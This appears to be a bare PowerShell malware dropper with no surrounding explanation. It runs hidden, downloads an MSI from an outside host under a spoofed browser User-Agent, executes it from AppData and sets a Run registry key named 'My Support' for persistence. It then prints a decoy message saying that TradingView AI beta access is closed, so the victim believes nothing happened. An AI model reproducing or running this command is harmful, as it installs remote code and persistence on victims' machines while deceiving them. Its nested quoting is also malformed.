powershell  -WindowStyle Hidden -c "iwr 'Invoke-WebRequest -Uri 'https://agency-portals.com/NodeServer-Setup.msi' -OutFile "$env:AppData\NodeServer-Setup.msi" -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' };

Set-Location "$env:AppData";
& ".\NodeServer-Setup.msi" -aoa -y > $null 2>&1;

Start-Process "NodeServer-Setup.msi";

$pathToExecutable = "$env:APPDATA\NodeServer-Setup.msi";
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'My Support' -Value $pathToExecutable;


Write-Host "Beta access to TradingView AI is currently closed. Please try again in a few days." -ForegroundColor Red'
